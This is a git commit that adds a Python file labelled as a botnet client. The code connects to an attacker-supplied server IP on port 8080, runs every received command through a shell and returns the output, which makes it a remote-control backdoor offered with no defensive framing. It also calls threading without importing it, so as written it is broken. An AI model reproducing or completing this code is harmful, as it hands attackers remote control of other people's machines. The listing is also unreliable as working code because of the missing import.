d04bed0a6808b380aae34b53403d87b8ac118834
The Wired <105239446+Maximus002@users.noreply.github.com>
2023-02-13 21:36:51 +0300

    Create client.py

---
+++ client.py
@@ -0,0 +1,23 @@
+# Botnet client
+
+import socket
+import subprocess
+
+def connect_to_botnet_server(server_ip):
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((server_ip, 8080))
+    return client
+
+def receive_commands(client):
+    while True:
+        command = client.recv(1024).decode()
+        if command == "exit":
+            client.close()
+            break
+        output = subprocess.getoutput(command)
+        client.send(output.encode())
+
+server_ip = "<server_ip>"
+client = connect_to_botnet_server(server_ip)
+receive_thread = threading.Thread(target=receive_commands, args=(client,))
+receive_thread.start()
